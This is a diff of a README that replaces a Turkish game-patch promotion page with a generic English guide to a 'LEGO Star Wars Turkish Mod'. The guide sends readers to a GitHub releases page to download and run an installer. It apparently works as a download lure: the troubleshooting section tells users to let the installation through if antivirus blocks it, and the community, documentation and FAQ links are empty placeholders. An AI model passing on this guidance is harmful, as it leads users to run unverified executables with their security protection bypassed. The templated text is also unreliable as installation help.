@@ -1,29 +1,78 @@
-[![https://turk-yama.com/lego-star-wars-the-video-game](https://turk-yama.com/wp-content/uploads/2025/07/lego-star-wars-the-video-game-turkce-yama-1.png)](https://turk-yama.com/lego-star-wars-the-video-game)
-# ✅ Indirmek:
-https://turk-yama.com/lego-star-wars-the-video-game
-# 💻 Açıklama:
-**Lego Star Wars: Video Oyunu - Türkçe Yama ile Yeni Bir Deneyim**
+# 🎮 Lego-Star-Wars-The-Video-Game-Turkce-Yama - Enjoy LEGO Star Wars in Turkish!
 
-Lego Star Wars: Video Oyunu, Star Wars evreninde geçen eğlenceli ve sürükleyici bir maceradır. Lego'nun eşsiz tarzıyla harmanlanmış bu oyun, hem küçük yaştaki oyunculara hem de yetişkinlere hitap eden eğlenceli bir deneyim sunuyor. Türkçe yama desteği ile artık bu harika oyunun tadını kendi dilimizde çıkarabilirsiniz.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/FurqaanR/Lego-Star-Wars-The-Video-Game-Turkce-Yama/releases)
 
-Oyun, ünlü Star Wars karakterlerini ve mekanlarını Lego bloklarıyla yeniden yaratıyor. Anakin Skywalker’dan Yoda’ya kadar birçok ikonik karakteri kontrol ederken, savaş gemileriyle uzayda yol alabilir veya Jedi yeteneklerinizi kullanarak düşmanlarınızı alt edebilirsiniz. Türkçe yamanın sağladığı dil desteği sayesinde, hikayeye daha derinlemesine dalabilir ve karakterlerin diyaloglarını kolaylıkla anlayabilirsiniz.
+## 🚀 Getting Started
 
-Lego Star Wars, hem tek başına hem de çoklu oyuncu modunda oynanabilir. Arkadaşlarınızla birlikte oynamak, bu eğlenceli macerayı daha da keyifli hale getiriyor. İşbirliği yaparak bulmacaları çözebilir, düşmanları alt edebilir ve galaksinin dört bir yanında maceralara atılabilirsiniz. Türkçe yama ile oyun deneyiminiz daha akıcı ve anlaşılır hale geliyor.
+Welcome to the LEGO Star Wars Turkish Mod! This mod enhances your gameplay by providing Turkish language support and content. This guide will help you download and run the mod easily.
 
-Kendinize özel karakterler yaratma imkanı, Lego Star Wars’un sunduğu bir diğer heyecan verici özellik. Farklı Lego parçalarını birleştirerek, kendi karakterinizi tasarlayabilir ve bu karakterle oyunun derinliklerine inebilirsiniz. Türkçe yamanın sağladığı açıklamalar sayesinde, karakter oluşturma süreci daha da eğlenceli hale geliyor.
+## 📥 Download & Install
 
-Oyun, çeşitli görevler ve yan görevlerle dolu, bu da oyunculara uzun bir oyun süresi sunuyor. Her bölümde keşfedilecek yeni alanlar ve tamamlanacak zorlu görevler mevcut. Türkçe yama ile bu görevlerin detaylarını daha iyi anlayarak, oyunun tadını çıkarabilirsiniz.
+To get started, you will need to visit the Releases page. Download the mod from the link below. 
 
-Lego Star Wars, sadece aksiyon dolu sahneleriyle değil, aynı zamanda mizahi unsurlarıyla da dikkat çekiyor. Lego'nun kendine has tarzı, Star Wars’un karanlık atmosferiyle birleşerek eğlenceli anlar sunuyor. Türkçe yamanız sayesinde bu mizahi unsurları daha iyi kavrayarak, oyunun keyfini katlayabilirsiniz.
+[Download the Mod Here](https://github.com/FurqaanR/Lego-Star-Wars-The-Video-Game-Turkce-Yama/releases)
 
-Grafikleri ve ses efektleriyle de dikkat çeken Lego Star Wars, oyunculara görsel bir şölen sunuyor. Lego dünyasının renkli ve eğlenceli yapısı, oyunun atmosferini daha da güçlendiriyor. Türkçe yama, bu görsel deneyimi destekleyerek, oyunculara daha iyi bir anlayış sağlıyor.
+### Steps to Download
 
-Sonuç olarak, Lego Star Wars: Video Oyunu, hem eğlenceli hem de öğretici bir deneyim sunuyor. Türkçe yama ile oyun, Türk oyuncular için daha erişilebilir hale geliyor. Bu harika oyunun kapılarını aralamak için hemen Türkçe yamanızı indirin ve galaksinin derinliklerine doğru unutulmaz bir yolculuğa çıkın!
-# ⚙️ Talimat:
-[![https://turk-yama.com/lego-star-wars-the-video-game](https://turk-yama.com/i.gif)](https://turk-yama.com/lego-star-wars-the-video-game)
-#
-[![https://turk-yama.com/lego-star-wars-the-video-game](https://turk-yama.com/l.svg)](https://turk-yama.com/lego-star-wars-the-video-game)
-# Etiketler:
-LEGO Star Wars Türkçe video, LEGO Star Wars yamanın kurulumu, LEGO Star Wars Türkçe klavuz, LEGO Star Wars yamanın faydaları, LEGO Star Wars dil yaması, LEGO Star Wars Türkçe ipuçları, LEGO Star Wars güncel yama, LEGO Star Wars mod yaması, LEGO Star Wars Türkçe bilgi, LEGO Star Wars modifiye, LEGO Star Wars Türkçe yama, LEGO Star Wars Türkçe ses, LEGO Star Wars Türkçe hikaye, LEGO Star Wars oyunu, LEGO Star Wars Türkçe içerik, LEGO Star Wars Türkçe, LEGO Star Wars Türkçe rehberi, LEGO Star Wars yerelleştirme, LEGO Star Wars Türkçe çözüm, LEGO Star Wars Türkçe topluluğu
+1. Click on the link above.
+2. Find the latest release. It will usually have the highest version number.
+3. Click on the file to start downloading. 
 
+### Installation Steps
 
+1. Once the file is downloaded, locate it in your computer’s Downloads folder.
+2. Extract the contents of the downloaded file. You can do this by right-clicking the file and selecting "Extract Here" if you have extraction software installed.
+3. Open the extracted folder and find the installation file.
+4. Double-click the installation file to start the installation process.
+5. Follow the prompts in the installation wizard. Choose your preferred installation folder if prompted.
+6. Once the installation is complete, you can find the game from your desktop or start menu.
+
+## 🖥️ System Requirements
+
+To run the LEGO Star Wars mod smoothly, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or higher
+- **RAM:** At least 4 GB
+- **Processor:** Intel Core i3 or equivalent
+- **Storage:** Minimum 2 GB free space
+- **Graphics Card:** DirectX 10 compatible
+- **Game Version:** Original LEGO Star Wars: The Video Game
+
+## 📚 Features
+
+This mod includes several features to enhance your gaming experience:
+
+- Turkish language support.
+- Translated dialogues and menus.
+- Improved game content tailored for the Turkish audience.
+- Access to community updates and tips.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues during installation or while playing the game, try the following tips:
+
+- Ensure your game is updated to the latest version.
+- Check if your antivirus software is blocking the mod. If so, you may need to allow the installation.
+- Restart your computer to resolve any temporary glitches.
+- Visit the community forums for additional support.
+
+## 🌐 Community Support
+
+Join our community to stay updated and get support from fellow players. You can find tips, tricks, and discussions regarding the mod.
+
+- Community Forum: [Visit Here](#)
+- YouTube Tutorials: [Watch Now](#)
+
+## 🔗 Useful Links
+
+- [Download the mod here](https://github.com/FurqaanR/Lego-Star-Wars-The-Video-Game-Turkce-Yama/releases)
+- [Game Documentation](#)
+- [FAQs](#)
+
+## 📬 Contact Us
+
+If you have questions or feedback, feel free to reach out:
+
+- Email: support@legostarwarsmod.com
+
+Thank you for choosing the LEGO Star Wars Turkish Mod! Enjoy your adventure in a galaxy far, far away!
